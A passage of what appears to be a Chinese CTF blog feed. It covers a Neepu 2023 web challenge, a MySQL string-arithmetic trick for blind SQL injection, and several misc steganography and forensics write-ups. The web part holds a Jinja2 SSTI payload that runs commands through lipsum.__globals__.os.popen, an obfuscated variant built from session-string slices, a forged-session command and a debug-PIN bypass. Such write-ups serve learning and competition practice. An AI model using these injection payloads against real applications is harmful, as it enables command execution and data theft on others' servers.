class="hljs-string">&quot;bxdQy9DN6FiCBXhNZFm3YwAgJ+Mn4+mRFiI0sYEP*NeepuCTF*&quot;</span> -t <span class="hljs-string">&quot;&#123;&#x27;/readflag&#x27;: 0, &#x27;__globals__&#x27;: 0, &#x27;admin&#x27;: 1, &#x27;os&#x27;: 0,&#x27;popen&#x27;: 0, &#x27;read&#x27;: 0&#125;&quot;</span><br><br>.eJyrVtIvSk1MSctJTFeyMtBRio9Pz8lPSswpjo8H8xNTcjPzlKwMdZTyi8ECBfkFqXlgFkgfkFELAMoaFFg.ZG5POw.jWk5AQmFaC172YwAbMbUXlICmm4<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/05/25/MoyJRDLIkpwg7ze.png" alt="image-20230525025204438"></p><p>如图，我们将session变量的值打印出来了，其中包含我们可以利用的字符串</p><p>接下来我们只需要构造如下ssti即可：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;%print(lipsum[&quot;__globals__&quot;][&quot;os&quot;][&quot;popen&quot;](&quot;/readflag&quot;)[&quot;read&quot;]())%&#125;<br></code></pre></td></tr></table></figure><p>结合session的payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;%print(lipsum[(session|string)[39:50]][(session|string)[69:71]][(session|string)[78:83]]((session|string)[23:32])[(session|string)[24:28]]())%&#125;<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/05/25/EZB1Te6imHUgFbu.png" alt="image-20230525025419723"></p><h5 id="非预期解："><a href="#非预期解：" class="headerlink" title="非预期解："></a>非预期解：</h5><p>由于题目开启了debug，并且可以任意文件读取，所以我们可以伪造debug界面的pin然后命令执行：</p><p><img src="https://s2.loli.net/2023/05/25/FojPluBMEev8DtL.png" alt="image-20230525025540055"></p><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="吉林第一站"><a href="#吉林第一站" class="headerlink" title="吉林第一站"></a>吉林第一站</h4><blockquote><p>吉林第一站，猜一猜我在哪里拍摄的吧！</p><p>风景1：三个字</p><p>风景2：三个字</p><p>风景3：六个字</p><p>flag内请填拼音，小写字母</p><p>flag格式：Neepu{风景1_风景2_风景3}</p></blockquote><p>社工题</p><p>风景1：朱雀山</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202305221130135.png" alt="image-20230522112959995"></p><p>风景二：松花湖</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202305221133363.png" alt="image-20230522113329134"></p><p>风景三：东北电力大学</p><p>使用百度识图</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202305221134929.png" alt="image-20230522113403880"></p><p>flag就是用配音拼起来</p><h4 id="重生之我是CTFer"><a href="#重生之我是CTFer" class="headerlink" title="重生之我是CTFer"></a>重生之我是CTFer</h4><p>玩游戏</p><h4 id="倒影"><a href="#倒影" class="headerlink" title="倒影"></a>倒影</h4><p>zsteg发现 <code>DNEI</code>，</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202305221153820.png" alt="image-20230522115300764"></p><p>然后也发现了<code>GNP</code> 是一张逆转的图片</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202305221153416.png" alt="image-20230522115334387"></p><p>反转一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;C://Users/LIKE/Desktop/1.png&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>)<br>fw=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;C://Users/LIKE/Desktop/2.png&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>)<br>data = f.read()[::-<span class="hljs-number">1</span>]<br>fw.write(data)<br></code></pre></td></tr></table></figure><p>得到另一张图片：</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202305221154173.png" alt="image-20230522115444890"></p><p>两种图片一模一样，是盲水印：</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202305221155215.png" alt="image-20230522115521161"></p><p>得到flag：</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202305221155888.png" alt="flag"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Neepu2023</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mysql字符拼接问题</title>
    <link href="/2023/08/24/mysql%E5%AD%97%E7%AC%A6%E6%8B%BC%E6%8E%A5%E9%97%AE%E9%A2%98/"/>
    <url>/2023/08/24/mysql%E5%AD%97%E7%AC%A6%E6%8B%BC%E6%8E%A5%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h2 id="mysql字符拼接问题"><a href="#mysql字符拼接问题" class="headerlink" title="mysql字符拼接问题"></a>mysql字符拼接问题</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>这里又学到一个新的东西：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-operator">+</span>database()<span class="hljs-operator">+</span><span class="hljs-string">&#x27;&#x27;</span>;<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/05/14/iveQg159RwbOLHz.png" alt="image-20230514181149881"></p><p>这样查询出来的结果为0，但是如果我们将 <code>database()</code> 进行hex编码：</p><p><img src="https://s2.loli.net/2023/05/14/Nxiy2vfUlEDbncO.png" alt="image-20230514181141241"></p><p>发现可以查询出数据库名被hex编码后的结果</p><p>我们想用这样的思路查询flag：</p><p><img src="https://s2.loli.net/2023/05/14/LRqQ9grasn7vKxc.png" alt="image-20230514181349021"></p><p><img src="https://s2.loli.net/2023/05/14/aiLuU64zFAG2yTD.png" alt="image-20230514181255328"></p><p>发现hex值被截断了，因为其中包含了英文字母，我们再次hex编码一次：</p><p><img src="https://s2.loli.net/2023/05/14/2kQOc9qJHuLnPBm.png" alt="image-20230514181426680"></p><p>我们发现flag两次hex编码后的值成了科学计数法，这样就可以逐字符盲注了。</p><p>还有另一种方法，使用<code>ascii()</code>将字符转为ascii码，这样就可以慢慢盲注了</p><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>经过测试<code>mysql</code>中 <code>+</code>的作用是用来进行数学运算</p><p>两个数字相加，返回两数之和</p><p><img src="https://s2.loli.net/2023/05/14/KVg8NMCA3PujBfy.png" alt="image-20230514183620161"></p><p>一个字符数字与一个数字相加，返回两数之和：</p><p><img src="https://s2.loli.net/2023/05/14/W43bG1rIJNy9MEc.png" alt="image-20230514183710570"></p><p>一个字符与一个数字相加，返回数字本身：(把字符转化为了0，所以相加就是该数字)</p><p><img src="https://s2.loli.net/2023/05/14/42AiUgnSxKBXVkt.png" alt="image-20230514184144830"></p><p>两个字符相加，返回数字0：</p><p><img src="https://s2.loli.net/2023/05/14/UzhG2pOTuaMRPEC.png" alt="image-20230514184214402"></p><p>一个数字与一个以数字开头的字符串相加，返回该数字与该字符串第一个字符前的数字值之和</p><p>(原因可能是弱类型转化，把以数字开头的字符串后面的字符给去掉了)</p><p><img src="https://s2.loli.net/2023/05/14/BALFxZ6aNh8blwg.png" alt="image-20230514184326783"></p><p>以字符开头的字符串与数值型相加，该字符串值为0</p><p><img src="https://s2.loli.net/2023/05/14/kzKahwBOblPCij9.png" alt="image-20230514184551728"></p><p>空字符串与字符串相加，由于弱类型转化，所以为0</p><p><img src="https://s2.loli.net/2023/05/14/RatnBsTcpbHIm1Z.png" alt="image-20230514184730079"></p><p>所以需要将flag转化为数值，才能盲注出来</p><p>其实原理类似于php中弱类型比较</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>mysql字符拼接问题</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MISC(第4页wp)</title>
    <link href="/2023/08/24/MISC(%E7%AC%AC4%E9%A1%B5wp)/"/>
    <url>/2023/08/24/MISC(%E7%AC%AC4%E9%A1%B5wp)/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="GUET-CTF2019-虚假的压缩包"><a href="#GUET-CTF2019-虚假的压缩包" class="headerlink" title="[GUET-CTF2019]虚假的压缩包"></a>[GUET-CTF2019]虚假的压缩包</h2><p>首先下载得到两个压缩包。</p><p>其中虚假的压缩包为 zip伪加密，我们使用工具 <code>ZipCenOp</code> 修复伪加密，打开txt文件：</p><img src="https://s2.loli.net/2023/01/30/aIin5KBXfVvk7Ae.png" alt="image-20230130152739042" style="zoom:33%;" /><p>这里有n、e可以联想到 <strong>RSA算法</strong>:</p><p><img src="https://s2.loli.net/2023/01/30/nuiGT5QxcPzmU2R.jpg" alt="在这里插入图片描述"></p><p>可以使用脚本爆破：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">gmpy2.mpz(n)#初始化一个大整数</span><br><span class="hljs-string">gmpy2.mpfr(x)# 初始化一个高精度浮点数x</span><br><span class="hljs-string">d = gmpy2.invert(e,n) # 求逆元，de = 1 mod n</span><br><span class="hljs-string">C = gmpy2.powmod(M,e,n)# 幂取模，结果是 C = (M^e) mod n</span><br><span class="hljs-string">gmpy2.is_prime(n) #素性检测</span><br><span class="hljs-string">gmpy2.gcd(a,b)  #欧几里得算法，最大公约数</span><br><span class="hljs-string">gmpy2.gcdext(a,b)  #扩展欧几里得算法</span><br><span class="hljs-string">gmpy2.iroot(x,n) #x开n次根</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>p = gmpy2.mpz(<span class="hljs-number">3</span>)<br>q = gmpy2.mpz(<span class="hljs-number">11</span>)<br>e = gmpy2.mpz(<span class="hljs-number">3</span>)<br>l = (p-<span class="hljs-number">1</span>) * (q-<span class="hljs-number">1</span>)<br>d = gmpy2.invert(e,l)<br>c = gmpy2.mpz(<span class="hljs-number">26</span>)<br>n = p * q<br>ans = <span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-built_in">print</span>(ans)<br></code></pre></td></tr></table></figure><p>输出：5</p><p>所以压缩包密码：<code>答案是5</code>  （一个整体）</p><p>真实的压缩包中有一张图片，但是我们使用 <code>HoneyView</code> 打不开，说明图片CRC值可能错误，</p><p>于是我们修改高度，可得：</p><img src="https://s2.loli.net/2023/01/30/J8LnvzxQfI52rXN.png" alt="image-20230130153426542" style="zoom:33%;" /><p>提示我们需要<code>异或5</code>，我们打开另一个文件：</p><p><img src="https://s2.loli.net/2023/01/30/nphCKXq9IvLU7ib.png" alt="image-20230130153527567"></p><p>应该是这里需要异或5，我们可以使用脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> binascii<br><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;C:/Users/LIKE/Desktop/data&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>)<br>data = f.read()<br>f.close()<br>rel = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> data:<br>    tmp = <span class="hljs-built_in">int</span>(s, <span class="hljs-number">16</span>) ^ <span class="hljs-number">5</span><br>    <span class="hljs-comment"># print(tmp)</span><br>    rel += <span class="hljs-built_in">hex</span>(tmp)[<span class="hljs-number">2</span>:]<br><br>fw = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;C:/Users/LIKE/Desktop/flag.docx&quot;</span>,<span class="hljs-string">&quot;wb&quot;</span>)<br>fw.write(binascii.unhexlify(rel))<br>fw.close()<br></code></pre></td></tr></table></figure><p>我们使用 <code>binascii.unhexlify()</code> 将16进制字符串转化为：16进制表示的二进制数据。</p><p>运行后获得一个word文档，我们打开：</p><p><img src="https://s2.loli.net/2023/01/30/VHJurP8C3w5Roat.png" alt="image-20230130153740183"></p><p>flag颜色是白色，我们改一下就可以看到。</p><h2 id="BSidesSF2019-zippy"><a href="#BSidesSF2019-zippy" class="headerlink" title="[BSidesSF2019]zippy"></a>[BSidesSF2019]zippy</h2><p>使用 foremost 分离出来一个加密压缩包，然后我们使用 wireshark 追踪tcp流：</p><img src="https://s2.loli.net/2023/01/30/6uwValQ7Nv5WKTF.png" alt="image-20230130154543061" style="zoom:33%;" /><p>发现了解压密码，用该密码解压得到flag</p><h2 id="SWPU2019-Network"><a href="#SWPU2019-Network" class="headerlink" title="[SWPU2019]Network"></a>[SWPU2019]Network</h2><p>打开txt文件，发现只有4中数字 <code>63、127、191、255</code></p><img src="https://s2.loli.net/2023/01/30/zSOT4d2cfiN1wrU.png" alt="image-20230130160425109" style="zoom:33%;" /><p>于是我们会想到我们ping网站时的 ： <code>TTL</code></p><p>这里是 <code>TTL隐写</code>:</p><blockquote><p> IP报文在路由间穿梭的时候每经过一个路由，TTL就会减1，当TTL为0的时候，该报文就会被丢弃。<br>    TTL所占的位数是8位，也就是0-255的范围，但是在大多数情况下通常只需要经过很小的跳数就能完成报文的转发，<br>    远远比上限255小得多，所以我们<strong>可以用TTL值的前两位来进行传输隐藏数据</strong>。</p><p>   如：须传送H字符，只需把H字符换成二进制，每两位为一组，每次填充到TTL字段的开头两位并把剩下的6位设置为1（xx111111），这样<strong>发4个IP报文即可传送1个字节</strong>。</p></blockquote><p>根据上述规则，可以知道TTL隐写中用到四个值：<code>00 111111</code>（63）,<code>01 111111</code>（127）,<code>10 111111</code>（191）,<code>11 111111</code>（255）,解密的时候只取前两位，然后转换成ascii</p><p>简化一下，可以这么认为：<br> 用</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">00 </span>替换 <span class="hljs-number">63</span><br><span class="hljs-symbol">01 </span>替换 <span class="hljs-number">127</span><br><span class="hljs-symbol">10 </span>替换 <span class="hljs-number">191</span><br><span class="hljs-symbol">11 </span>替换 <span class="hljs-number">255</span><br></code></pre></td></tr></table></figure><p>我们可以写脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> binascii<br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;attachment.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>)<br>f2=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;result.txt&quot;</span>,<span class="hljs-string">&quot;wb&quot;</span>)<br>num=<span class="hljs-string">&#x27;&#x27;</span><br>res=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> f:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(i)==<span class="hljs-number">63</span>:<br>        num+=<span class="hljs-string">&quot;00&quot;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(i)==<span class="hljs-number">127</span>:<br>        num+=<span class="hljs-string">&quot;01&quot;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(i)==<span class="hljs-number">191</span>:<br>        num+=<span class="hljs-string">&quot;10&quot;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(i)==<span class="hljs-number">255</span>:<br>        num+=<span class="hljs-string">&quot;11&quot;</span><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(num),<span class="hljs-number">8</span>):<br>    res += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(num[j:j+<span class="hljs-number">8</span>],<span class="hljs-number">2</span>))<span class="hljs-comment">#转换为字符</span><br>res = binascii.unhexlify(res)<span class="hljs-comment">#unhexlify:从十六进制字符串返回二进制数据</span><br>f2.write(res)<br></code></pre></td></tr></table></figure><p>得到一个压缩包伪加密</p><p><img src="https://s2.loli.net/2023/01/30/AO5PiXCybsTaGBJ.png" alt="img"></p><p>我们修复伪加密，打开：</p><p><img src="https://s2.loli.net/2023/01/30/1GXD9cfWlA6Zobk.png" alt="image-20230130161025009"></p><p>发现一大串 base64编码，且被多次编码了。</p><p>我们可以使用脚本进行解密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>)<br>a=f.read()<br><span class="hljs-built_in">print</span>(f,a)<br>res=base64.b64decode(a)<br><br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):<br>    res=base64.b64decode(res)<br>    <span class="hljs-built_in">print</span>(res)<br></code></pre></td></tr></table></figure><h2 id="RCTF2019-draw"><a href="#RCTF2019-draw" class="headerlink" title="[RCTF2019]draw"></a>[RCTF2019]draw</h2><p>打开发现一堆字母</p><p><img src="https://s2.loli.net/2023/01/30/TwoBW3EhfqemKJL.png" alt="image-20230130173428103"></p><p>看了wp说使用 <a href="https://www.calormen.com/jslogo/">logo解释器</a></p><p><img src="https://s2.loli.net/2023/01/30/3i5voU69DCcZlaL.png" alt="image-20230130173545997"></p><h2 id="UTCTF2020-basic-forensics"><a href="#UTCTF2020-basic-forensics" class="headerlink" title="[UTCTF2020]basic-forensics"></a>[UTCTF2020]basic-forensics</h2><p>使用 <code>010Editor</code> 打开，直接搜 flag：</p><img src="https://s2.loli.net/2023/01/30/8A6p1EhMKwonsJu.png" alt="image-20230130173741943" style="zoom: 50%;" /><h2 id="ACTF新生赛2020-明文攻击"><a href="#ACTF新生赛2020-明文攻击" class="headerlink" title="[ACTF新生赛2020]明文攻击"></a>[ACTF新生赛2020]明文攻击</h2><p>我们使用 <code>010Editor</code> 打开 woo.jpg:</p><img src="https://s2.loli.net/2023/01/30/d7at4RpYKi6gVCc.png" alt="image-20230130174706604" style="zoom:33%;" /><p>我们发现图片结尾藏有一个压缩包，但是缺少文件头 <code>50 4B</code>，我们给他加上保存为 zip文件：</p><img src="https://s2.loli.net/2023/01/30/LmBux68Wto1KEiX.png" alt="image-20230130174816617" style="zoom: 50%;" /><p>然后我们发现，生成的压缩包与原有的压缩包中有相同的内容，CRC32的值一样</p><img src="https://s2.loli.net/2023/01/30/W1tCgrqB8eEYGyO.png" alt="image-20230130174845385" style="zoom:33%;" /><p>于是我们可以使用 <code>ARCHPR</code> 进行<strong>明文爆破</strong>：</p><p><img src="https://s2.loli.net/2023/01/30/T79VI2pPSrCQoBq.jpg" alt="在这里插入图片描述"></p><h2 id="MRCTF2020-Hello-misc"><a href="#MRCTF2020-Hello-misc" class="headerlink" title="[MRCTF2020]Hello_ misc"></a>[MRCTF2020]Hello_ misc</h2><p>下载后得到一张png图片和一个 rar压缩包：</p><img src="https://s2.loli.net/2023/01/30/dMhPr28NY3buRHv.png" alt="image-20230130192911190" style="zoom: 33%;" /><p> 我们使用 <code>foremost</code> 分离png图片，得到一个zip压缩包：</p><img src="https://s2.loli.net/2023/01/30/puXQiLDnfR5bNjO.png" alt="image-20230130192958258" style="zoom:33%;" /><p>但是我们不知道密码，爆破也不行，于是我们使用 linux中 <code>zsteg</code> 分析png图片：</p><p><img src="https://s2.loli.net/2023/01/30/7LiTqcDpz28YZJV.png" alt="image-20230130193109377"></p><p>提示我们图片中还隐藏一张png图片，于是我们可以使用 <code>zsteg -E</code> 分离图片：</p><blockquote><p><strong>-E</strong>, –extract NAME               extract specified payload, NAME is like ‘1b,rgb,lsb’</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">zsteg a.png -E <span class="hljs-string">&quot;b1,r,lsb,xy&quot;</span> &gt; flag.png<br></code></pre></td></tr></table></figure><p>分离得到图片：</p><img src="https://s2.loli.net/2023/01/30/y5bwRQSxnKFalBA.png" alt="image-20230130193500066" style="zoom:33%;" /><p>获得压缩包密码。</p><p>或者我们可以使用 <code>Stegsolve</code> 在<code>red通道</code>发现图片：</p><img src="https://s2.loli.net/2023/01/30/dxrLsha4CJVmc3Q.png" alt="image-20230130193623756" style="zoom:33%;" /><p>解压压缩包：</p><img src="https://s2.loli.net/2023/01/30/6YbonJh3EdpNQUs.png" alt="image-20230130193746175" style="zoom:33%;" /><p>这是 <code>TTL隐写</code> ，我们使用脚本:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python">fr = <span class="hljs-built_in">open</span>(<span class="hljs-string">r&quot;C:/Users/LIKE/Desktop/out.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>)<br>lines = fr.readlines()<br>fr.close()<br>num = <span class="hljs-string">&quot;&quot;</span><br>string = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(lines)):<br>    line = lines[i]<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;63&quot;</span> <span class="hljs-keyword">in</span> line:<br>        num += <span class="hljs-string">&quot;00&quot;</span><br>    <span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;127&quot;</span> <span class="hljs-keyword">in</span> line:<br>        num += <span class="hljs-string">&quot;01&quot;</span><br>    <span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;191&quot;</span> <span class="hljs-keyword">in</span> line:<br>        num += <span class="hljs-string">&quot;10&quot;</span><br>    <span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;255&quot;</span> <span class="hljs-keyword">in</span> line:<br>        num += <span class="hljs-string">&quot;11&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(num) , <span class="hljs-number">8</span>):<br>    string += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(num[i:i + <span class="hljs-number">8</span>], <span class="hljs-number">2</span>))<br><br><span class="hljs-built_in">print</span>(string)<br></code></pre></td></tr></table></figure><p>输出： <code>rar-passwd:0ac1fe6b77be5dbe</code></p><p>我们使用该密码解压 rar压缩包：</p><p>得到压缩包：<code>fffflag.zip</code>，我们发现压缩包中的内容就是word文档文件，</p><p>于是我们将后缀改为docx，即：<code>fffflag.docx</code>。打开：</p><img src="https://s2.loli.net/2023/01/30/iH3hRpZAyTfKb1u.png" alt="image-20230130194303200" style="zoom:50%;" /><p>发现全是base64编码，我们写个脚本解码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;C://Users/LIKE/Desktop/data.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>)<br>lines = f.readlines()<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:<br>    <span class="hljs-built_in">print</span>(base64.b64decode(line).decode(<span class="hljs-string">&quot;utf-8&quot;</span>))<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/01/30/wci2FD5qYvgnTRQ.png" alt="image-20230130195139423"></p><p>我们发现 <code>0</code> 好像构成了什么字符，于是我们把 <code>1</code> 替换成空格：</p><p><img src="https://s2.loli.net/2023/01/30/HbziyuMP4LWm6wT.png" alt="image-20230130195234429"></p><p><code>flag&#123;He1Lo_mi5c~&#125;</code></p><h2 id="WUSTCTF2020-spaceclub"><a href="#WUSTCTF2020-spaceclub" class="headerlink" title="[WUSTCTF2020]spaceclub"></a>[WUSTCTF2020]spaceclub</h2><p>下载后得到一个txt文件，里面全是空格：</p><img src="https://s2.loli.net/2023/01/30/RzV41qIW9G6FDNb.png" alt="image-20230130195613476" style="zoom:33%;" /><p>但是我们发现空格有一长一短的规律，于是我们可以把短的空格替换为0，长的空格替换为1：</p><img src="https://s2.loli.net/2023/01/30/MQvZkyATPdJFu8w.png" alt="image-20230130200148859" style="zoom:33%;" /><p>我们猜测，只要将这一串二进制串转为字符，就能得到flag，于是我们上脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">f = <span class="hljs-built_in">open</span>(<span class="hljs-string">r&quot;C:/Users/LIKE/Desktop/d.txt&quot;</span>)<br>lines = f.readlines()<br>f.close()<br>flag = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:<br>    flag += line.replace(<span class="hljs-string">&quot;\n&quot;</span>,<span class="hljs-string">&quot;&quot;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(flag), <span class="hljs-number">8</span>):<br>    s = <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(flag[i:i+<span class="hljs-number">8</span>], <span class="hljs-number">2</span>)) <span class="hljs-comment"># 先将二进制转为ascii码(10进制)，然后转为字符输出</span><br>    <span class="hljs-built_in">print</span>(s, end=<span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><p>输出： <code>wctf2020&#123;h3re_1s_y0ur_fl@g_s1x_s1x_s1x&#125;</code></p><h2 id="UTCTF2020-zero"><a href="#UTCTF2020-zero" class="headerlink" title="[UTCTF2020]zero"></a>[UTCTF2020]zero</h2><p>下载后得到一个txt文件，我们使用 sublime打开，发现有很多不知道什么东西，隐藏起来了。</p><p><img src="https://s2.loli.net/2023/01/30/jCspv8LKqJD9zeO.png" alt="image-20230130200910041"></p><p>我们再用记事本打开：</p><img src="https://s2.loli.net/2023/01/30/Czw7aW4Ot6lZNPr.png" alt="image-20230130200950807" style="zoom:33%;" /><p>没有发现什么东西，但是我们使用方向键 <code>-&gt;</code>  发现有时候移动不了光标，</p><p>于是我们想起了： <code>零宽字符隐写</code></p><p><a href="https://www.mzy0.com/ctftools/zerowidth1/">零宽字符解密</a></p><p><img src="https://s2.loli.net/2023/01/30/t3R8JSd4GalhuqT.png" alt="image-20230130201136305"></p><h2 id="MRCTF2020-Unravel"><a href="#MRCTF2020-Unravel" class="headerlink" title="[MRCTF2020]Unravel!!"></a>[MRCTF2020]Unravel!!</h2><p>下载得到3个文件</p><img src="https://s2.loli.net/2023/01/30/fcQ9bZTaOBrSEpq.png" alt="image-20230130203102548" style="zoom: 50%;" /><p>我们使用 <code>010Editor</code> 查看 <code>Look_at_the_file_ending.wav</code> 文件结尾：</p><img src="https://s2.loli.net/2023/01/30/HVPMzO6uiQKclSx.png" alt="image-20230130203230098" style="zoom:33%;" /><p>发现了某种编码（AES、DES）</p><p>然后我们使用 <code>foremost</code> 分离 JM.png：</p><img src="https://s2.loli.net/2023/01/30/sx5TuKFt34CzIXG.png" alt="image-20230130203335409" style="zoom:33%;" /><img src="https://s2.loli.net/2023/01/30/M769KqIHZsTcSmW.png" alt="image-20230130203413255" style="zoom:50%;" /><p>图片名为： <code>aes</code> 